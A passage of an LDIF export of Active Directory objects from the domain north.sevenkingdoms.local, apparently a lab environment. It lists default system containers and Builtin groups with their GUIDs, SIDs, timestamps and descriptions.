uSNCreated: 7902  
uSNChanged: 7902  
showInAdvancedViewOnly: TRUE  
name: Windows2003Update  
objectGUID:: cnYv1kc3IESjKZlO0Aka4Q==  
revision: 9  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# ActiveDirectoryUpdate, DomainUpdates, System, north.sevenkingdoms.local  
dn: CN=ActiveDirectoryUpdate,CN=DomainUpdates,CN=System,DC=north,DC=sevenkingd  
 oms,DC=local  
objectClass: top  
objectClass: container  
cn: ActiveDirectoryUpdate  
distinguishedName: CN=ActiveDirectoryUpdate,CN=DomainUpdates,CN=System,DC=nort  
 h,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7903  
uSNChanged: 7903  
showInAdvancedViewOnly: TRUE  
name: ActiveDirectoryUpdate  
objectGUID:: 2OvgY4MR2EqV2+41f5E+mw==  
revision: 16  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Password Settings Container, System, north.sevenkingdoms.local  
dn: CN=Password Settings Container,CN=System,DC=north,DC=sevenkingdoms,DC=loca  
 l

\# PSPs, System, north.sevenkingdoms.local  
dn: CN=PSPs,CN=System,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
objectClass: msImaging-PSPs  
cn: PSPs  
distinguishedName: CN=PSPs,CN=System,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7905  
uSNChanged: 7905  
name: PSPs  
objectGUID:: oZg4V1kAM0W8s1G9pZTzFA==  
objectCategory: CN=ms-Imaging-PSPs,CN=Schema,CN=Configuration,DC=sevenkingdoms  
 ,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# LostAndFound, north.sevenkingdoms.local  
dn: CN=LostAndFound,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: lostAndFound  
cn: LostAndFound  
description: Default container for orphaned objects  
distinguishedName: CN=LostAndFound,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163117.0Z  
whenChanged: 20250413163117.0Z  
uSNCreated: 7760  
uSNChanged: 7760  
showInAdvancedViewOnly: TRUE  
name: LostAndFound  
objectGUID:: G27a23cT1U6ZuK9zwgVToQ==  
systemFlags: \-1946157056  
objectCategory: CN=Lost-And-Found,CN=Schema,CN=Configuration,DC=sevenkingdoms,  
 DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Infrastructure, north.sevenkingdoms.local  
dn: CN=Infrastructure,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: infrastructureUpdate  
cn: Infrastructure  
distinguishedName: CN=Infrastructure,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7907  
uSNChanged: 7907  
showInAdvancedViewOnly: TRUE  
name: Infrastructure  
objectGUID:: tBLjDby9GUKlIahsXISDMg==  
fSMORoleOwner: CN=NTDS Settings,CN=WINTERFELL,CN=Servers,CN=Default-First-Site  
 \-Name,CN=Sites,CN=Configuration,DC=sevenkingdoms,DC=local  
systemFlags: \-1946157056  
objectCategory: CN=Infrastructure-Update,CN=Schema,CN=Configuration,DC=sevenki  
 ngdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# ForeignSecurityPrincipals, north.sevenkingdoms.local  
dn: CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: ForeignSecurityPrincipals  
description: Default container for security identifiers (SIDs) associated with  
  objects from external, trusted domains  
distinguishedName: CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7908  
uSNChanged: 7908  
showInAdvancedViewOnly: FALSE  
name: ForeignSecurityPrincipals  
objectGUID:: Kv0rW/c1FE2uUiYrBGTgdQ==  
systemFlags: \-1946157056  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# S-1-5-17, ForeignSecurityPrincipals, north.sevenkingdoms.local  
dn: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=loca  
 l  
objectClass: top  
objectClass: foreignSecurityPrincipal  
cn: S-1-5-17  
distinguishedName: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=north,DC=sevenk  
 ingdoms,DC=local  
showInAdvancedViewOnly: TRUE  
name: S-1-5-17  
objectGUID:: ZwLu9CMlaEe5bdOBvj7eTg==  
objectSid:: AQEAAAAAAAURAAAA  
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=se  
 venkingdoms,DC=local

\# S-1-5-9, ForeignSecurityPrincipals, north.sevenkingdoms.local  
dn: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: foreignSecurityPrincipal  
cn: S-1-5-9  
distinguishedName: CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=north,DC=sevenki  
 ngdoms,DC=local  
showInAdvancedViewOnly: TRUE  
name: S-1-5-9  
objectGUID:: O62rLMsbPU+cZaftIr8yLQ==  
objectSid:: AQEAAAAAAAUJAAAA  
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=se  
 venkingdoms,DC=local

\# S-1-5-4, ForeignSecurityPrincipals, north.sevenkingdoms.local  
dn: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: foreignSecurityPrincipal  
cn: S-1-5-4  
distinguishedName: CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=north,DC=sevenki  
 ngdoms,DC=local  
showInAdvancedViewOnly: TRUE  
name: S-1-5-4  
objectGUID:: pt/LCyaKr0uhE6IiZ1QkOg==  
objectSid:: AQEAAAAAAAUEAAAA  
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=se  
 venkingdoms,DC=local

\# S-1-5-11, ForeignSecurityPrincipals, north.sevenkingdoms.local  
dn: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=loca  
 l  
objectClass: top  
objectClass: foreignSecurityPrincipal  
cn: S-1-5-11  
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=north,DC=sevenk  
 ingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8208  
memberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=north,DC=sevenki  
 ngdoms,DC=local  
memberOf: CN=Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
uSNChanged: 8208  
showInAdvancedViewOnly: TRUE  
name: S-1-5-11  
objectGUID:: ErSl7CE8Xk2bsSPoJHLeQQ==  
objectSid:: AQEAAAAAAAULAAAA  
objectCategory: CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=se  
 venkingdoms,DC=local  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Program Data, north.sevenkingdoms.local  
dn: CN=Program Data,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Program Data  
description: Default location for storage of application data.  
distinguishedName: CN=Program Data,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7909  
uSNChanged: 7909  
showInAdvancedViewOnly: TRUE  
name: Program Data  
objectGUID:: yxI1NoGQ7ki6N7AyVk4TSQ==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Microsoft, Program Data, north.sevenkingdoms.local  
dn: CN=Microsoft,CN=Program Data,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Microsoft  
description: Default location for storage of Microsoft application data.  
distinguishedName: CN=Microsoft,CN=Program Data,DC=north,DC=sevenkingdoms,DC=l  
 ocal  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7910  
uSNChanged: 7910  
showInAdvancedViewOnly: TRUE  
name: Microsoft  
objectGUID:: btDxaIcuD0mnoW4aZuDmQg==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# NTDS Quotas, north.sevenkingdoms.local  
dn: CN=NTDS Quotas,DC=north,DC=sevenkingdoms,DC=local

\# Managed Service Accounts, north.sevenkingdoms.local  
dn: CN=Managed Service Accounts,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: container  
cn: Managed Service Accounts  
description: Default container for managed service accounts  
distinguishedName: CN=Managed Service Accounts,DC=north,DC=sevenkingdoms,DC=lo  
 cal  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 7912  
uSNChanged: 7912  
showInAdvancedViewOnly: FALSE  
name: Managed Service Accounts  
objectGUID:: ZJinNaJGaUmwvdEn51cuEw==  
objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=lo  
 cal  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Keys, north.sevenkingdoms.local  
dn: CN=Keys,DC=north,DC=sevenkingdoms,DC=local

\# TPM Devices, north.sevenkingdoms.local  
dn: CN=TPM Devices,DC=north,DC=sevenkingdoms,DC=local

\# Builtin, north.sevenkingdoms.local  
dn: CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: builtinDomain  
cn: Builtin  
distinguishedName: CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8200  
uSNChanged: 8200  
showInAdvancedViewOnly: FALSE  
name: Builtin  
objectGUID:: g0Q4Grh9L0qnVX+5mEX77g==  
creationTime: 133627605310709789  
forceLogoff: \-9223372036854775808  
lockoutDuration: \-18000000000  
lockOutObservationWindow: \-18000000000  
lockoutThreshold: 0  
maxPwdAge: \-37108517437440  
minPwdAge: 0  
minPwdLength: 0  
modifiedCountAtLastProm: 0  
nextRid: 1000  
pwdProperties: 0  
pwdHistoryLength: 0  
objectSid:: AQEAAAAAAAUgAAAA  
serverState: 1  
uASCompat: 1  
modifiedCount: 141  
systemFlags: \-1946157056  
objectCategory: CN=Builtin-Domain,CN=Schema,CN=Configuration,DC=sevenkingdoms,  
 DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Replicator, Builtin, north.sevenkingdoms.local  
dn: CN=Replicator,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Replicator  
description: Supports file replication in a domain  
distinguishedName: CN=Replicator,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413164658.0Z  
uSNCreated: 8218  
uSNChanged: 13655  
name: Replicator  
objectGUID:: p4WZFtP4gUODJg43KIPFOA==  
objectSid:: AQIAAAAAAAUgAAAAKAIAAA==  
adminCount: 1  
sAMAccountName: Replicator  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413164658.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010714042016.0Z

\# Remote Desktop Users, Builtin, north.sevenkingdoms.local  
dn: CN=Remote Desktop Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Remote Desktop Users  
description: Members in this group are granted the right to logon remotely  
member: CN=Stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local  
distinguishedName: CN=Remote Desktop Users,CN=Builtin,DC=north,DC=sevenkingdom  
 s,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413164901.0Z  
uSNCreated: 8219  
uSNChanged: 13744  
name: Remote Desktop Users  
objectGUID:: d4uyKYOlSkiK/CKe/lkBPA==  
objectSid:: AQIAAAAAAAUgAAAAKwIAAA==  
sAMAccountName: Remote Desktop Users  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Network Configuration Operators, Builtin, north.sevenkingdoms.local  
dn: CN=Network Configuration Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC  
 \=local  
objectClass: top  
objectClass: group  
cn: Network Configuration Operators  
description: Members in this group can have some administrative privileges to   
 manage configuration of networking features  
distinguishedName: CN=Network Configuration Operators,CN=Builtin,DC=north,DC=s  
 evenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8220  
uSNChanged: 8220  
name: Network Configuration Operators  
objectGUID:: z+FuinKkrkGLGqpo240gXw==  
objectSid:: AQIAAAAAAAUgAAAALAIAAA==  
sAMAccountName: Network Configuration Operators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Performance Monitor Users, Builtin, north.sevenkingdoms.local  
dn: CN=Performance Monitor Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Performance Monitor Users  
description: Members of this group can access performance counter data locally  
  and remotely  
distinguishedName: CN=Performance Monitor Users,CN=Builtin,DC=north,DC=sevenki  
 ngdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8221  
uSNChanged: 8221  
name: Performance Monitor Users  
objectGUID:: sW69Hq5knkq+oSNej6BcUQ==  
objectSid:: AQIAAAAAAAUgAAAALgIAAA==  
sAMAccountName: Performance Monitor Users  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Performance Log Users, Builtin, north.sevenkingdoms.local  
dn: CN=Performance Log Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Performance Log Users  
description: Members of this group may schedule logging of performance counter  
 s, enable trace providers, and collect event traces both locally and via remo  
 te access to this computer  
distinguishedName: CN=Performance Log Users,CN=Builtin,DC=north,DC=sevenkingdo  
 ms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8222  
uSNChanged: 8222  
name: Performance Log Users  
objectGUID:: KUffm7FSbUqW2aBLKSqC0g==  
objectSid:: AQIAAAAAAAUgAAAALwIAAA==  
sAMAccountName: Performance Log Users  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Distributed COM Users, Builtin, north.sevenkingdoms.local  
dn: CN=Distributed COM Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Distributed COM Users  
description: Members are allowed to launch, activate and use Distributed COM o  
 bjects on this machine.  
distinguishedName: CN=Distributed COM Users,CN=Builtin,DC=north,DC=sevenkingdo  
 ms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8223  
uSNChanged: 8223  
name: Distributed COM Users  
objectGUID:: xxBBE9NIv0S4rpu9h4Q7Pg==  
objectSid:: AQIAAAAAAAUgAAAAMgIAAA==  
sAMAccountName: Distributed COM Users  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# IIS\_IUSRS, Builtin, north.sevenkingdoms.local  
dn: CN=IIS\_IUSRS,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: IIS\_IUSRS  
description: Built-in group used by Internet Information Services.  
member: CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=north,DC=sevenkingdoms,DC=  
 local  
distinguishedName: CN=IIS\_IUSRS,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8224  
uSNChanged: 8227  
name: IIS\_IUSRS  
objectGUID:: If/C8Mwb3kKyprzqa2BzXQ==  
objectSid:: AQIAAAAAAAUgAAAAOAIAAA==  
sAMAccountName: IIS\_IUSRS  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Cryptographic Operators, Builtin, north.sevenkingdoms.local  
dn: CN=Cryptographic Operators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Cryptographic Operators  
description: Members are authorized to perform cryptographic operations.  
distinguishedName: CN=Cryptographic Operators,CN=Builtin,DC=north,DC=sevenking  
 doms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8228  
uSNChanged: 8228  
name: Cryptographic Operators  
objectGUID:: YzQxny4eU0yv29NDlXwWfg==  
objectSid:: AQIAAAAAAAUgAAAAOQIAAA==  
sAMAccountName: Cryptographic Operators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Event Log Readers, Builtin, north.sevenkingdoms.local  
dn: CN=Event Log Readers,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Event Log Readers  
description: Members of this group can read event logs from local machine  
distinguishedName: CN=Event Log Readers,CN=Builtin,DC=north,DC=sevenkingdoms,D  
 C=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8229  
uSNChanged: 8229  
name: Event Log Readers  
objectGUID:: hmPT9wrk+0a41pTpMGxWLA==  
objectSid:: AQIAAAAAAAUgAAAAPQIAAA==  
sAMAccountName: Event Log Readers  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Certificate Service DCOM Access, Builtin, north.sevenkingdoms.local  
dn: CN=Certificate Service DCOM Access,CN=Builtin,DC=north,DC=sevenkingdoms,DC  
 \=local  
objectClass: top  
objectClass: group  
cn: Certificate Service DCOM Access  
description: Members of this group are allowed to connect to Certification Aut  
 horities in the enterprise  
distinguishedName: CN=Certificate Service DCOM Access,CN=Builtin,DC=north,DC=s  
 evenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8230  
uSNChanged: 8230  
name: Certificate Service DCOM Access  
objectGUID:: MqMp3H351EqPeFkaD2OJZQ==  
objectSid:: AQIAAAAAAAUgAAAAPgIAAA==  
sAMAccountName: Certificate Service DCOM Access  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# RDS Remote Access Servers, Builtin, north.sevenkingdoms.local  
dn: CN=RDS Remote Access Servers,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: RDS Remote Access Servers  
description: Servers in this group enable users of RemoteApp programs and pers  
 onal virtual desktops access to these resources. In Internet-facing deploymen  
 ts, these servers are typically deployed in an edge network. This group needs  
  to be populated on servers running RD Connection Broker. RD Gateway servers   
 and RD Web Access servers used in the deployment need to be in this group.  
distinguishedName: CN=RDS Remote Access Servers,CN=Builtin,DC=north,DC=sevenki  
 ngdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8231  
uSNChanged: 8231  
name: RDS Remote Access Servers  
objectGUID:: YIhnH/LjskejkJGQog01hw==  
objectSid:: AQIAAAAAAAUgAAAAPwIAAA==  
sAMAccountName: RDS Remote Access Servers  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# RDS Endpoint Servers, Builtin, north.sevenkingdoms.local  
dn: CN=RDS Endpoint Servers,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: RDS Endpoint Servers  
description: Servers in this group run virtual machines and host sessions wher  
 e users RemoteApp programs and personal virtual desktops run. This group need  
 s to be populated on servers running RD Connection Broker. RD Session Host se  
 rvers and RD Virtualization Host servers used in the deployment need to be in  
  this group.  
distinguishedName: CN=RDS Endpoint Servers,CN=Builtin,DC=north,DC=sevenkingdom  
 s,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8232  
uSNChanged: 8232  
name: RDS Endpoint Servers  
objectGUID:: oRJ3fYtSi06GB8hSD7ebfw==  
objectSid:: AQIAAAAAAAUgAAAAQAIAAA==  
sAMAccountName: RDS Endpoint Servers  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# RDS Management Servers, Builtin, north.sevenkingdoms.local  
dn: CN=RDS Management Servers,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: RDS Management Servers  
description: Servers in this group can perform routine administrative actions   
 on servers running Remote Desktop Services. This group needs to be populated   
 on all servers in a Remote Desktop Services deployment. The servers running t  
 he RDS Central Management service must be included in this group.  
distinguishedName: CN=RDS Management Servers,CN=Builtin,DC=north,DC=sevenkingd  
 oms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8233  
uSNChanged: 8233  
name: RDS Management Servers  
objectGUID:: A6/9N5ciS0+HuJkYz3TqZA==  
objectSid:: AQIAAAAAAAUgAAAAQQIAAA==  
sAMAccountName: RDS Management Servers  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Hyper-V Administrators, Builtin, north.sevenkingdoms.local  
dn: CN=Hyper-V Administrators,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Hyper-V Administrators  
description: Members of this group have complete and unrestricted access to al  
 l features of Hyper-V.  
distinguishedName: CN=Hyper-V Administrators,CN=Builtin,DC=north,DC=sevenkingd  
 oms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8234  
uSNChanged: 8234  
name: Hyper-V Administrators  
objectGUID:: DCQI6AnO50mP6C7LsWKLtg==  
objectSid:: AQIAAAAAAAUgAAAAQgIAAA==  
sAMAccountName: Hyper-V Administrators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Access Control Assistance Operators, Builtin, north.sevenkingdoms.local  
dn: CN=Access Control Assistance Operators,CN=Builtin,DC=north,DC=sevenkingdom  
 s,DC=local  
objectClass: top  
objectClass: group  
cn: Access Control Assistance Operators  
description: Members of this group can remotely query authorization attributes  
  and permissions for resources on this computer.  
distinguishedName: CN=Access Control Assistance Operators,CN=Builtin,DC=north,  
 DC=sevenkingdoms,DC=local  
instanceType: 4  
whenCreated: 20250413163118.0Z  
whenChanged: 20250413163118.0Z  
uSNCreated: 8235  
uSNChanged: 8235  
name: Access Control Assistance Operators  
objectGUID:: CXshcWEVC0ukkkLBFItjbw==  
objectSid:: AQIAAAAAAAUgAAAAQwIAAA==  
sAMAccountName: Access Control Assistance Operators  
sAMAccountType: 536870912  
systemFlags: \-1946157056  
groupType: \-2147483643  
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=sevenkingdoms,DC=local  
isCriticalSystemObject: TRUE  
dSCorePropagationData: 20250413165358.0Z  
dSCorePropagationData: 20250413165356.0Z  
dSCorePropagationData: 20250413163148.0Z  
dSCorePropagationData: 16010101181633.0Z

\# Remote Management Users, Builtin, north.sevenkingdoms.local  
dn: CN=Remote Management Users,CN=Builtin,DC=north,DC=sevenkingdoms,DC=local  
objectClass: top  
objectClass: group  
cn: Remote Management Users  
description: Members of this group can access WMI resources over management pr  
